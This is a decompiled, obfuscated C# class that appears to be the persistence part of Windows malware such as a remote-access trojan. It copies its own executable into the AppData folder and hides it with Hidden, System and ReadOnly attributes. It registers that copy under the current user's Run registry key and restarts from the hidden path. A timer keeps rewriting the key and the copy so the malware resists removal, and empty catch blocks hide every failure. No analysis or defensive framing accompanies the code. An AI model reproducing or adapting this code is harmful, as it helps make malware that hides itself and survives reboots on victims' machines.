using System;
using System.Diagnostics;
using System.IO;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class12
{
	private Timer timer_0;

	public static void smethod_0()
	{
		smethod_4();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			try
			{
				registryKey.DeleteValue(Class6.string_8, throwOnMissingValue: true);
			}
			catch
			{
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public void method_0()
	{
		if (timer_0 != null)
		{
			timer_0.Enabled = false;
			timer_0.Stop();
		}
	}

	public void method_1()
	{
		smethod_2();
		smethod_3();
		timer_0 = new Timer(Class6.int_4);
		timer_0.Elapsed += smethod_1;
		timer_0.AutoReset = true;
		timer_0.Enabled = true;
	}

	private static void smethod_1(object sender, ElapsedEventArgs e)
	{
		smethod_2();
		smethod_3();
	}

	private static void smethod_2()
	{
		string value = smethod_4();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			try
			{
				registryKey.SetValue(Class6.string_8, value);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static void smethod_3()
	{
		string text = smethod_4();
		try
		{
			File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		try
		{
			File.SetAttributes(text, FileAttributes.Normal);
		}
		catch
		{
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), text, overwrite: true);
			File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		try
		{
			if (Application.get_ExecutablePath() != text)
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo(text);
				process.Start();
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	private static string smethod_4()
	{
		return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Class6.string_7);
	}
}
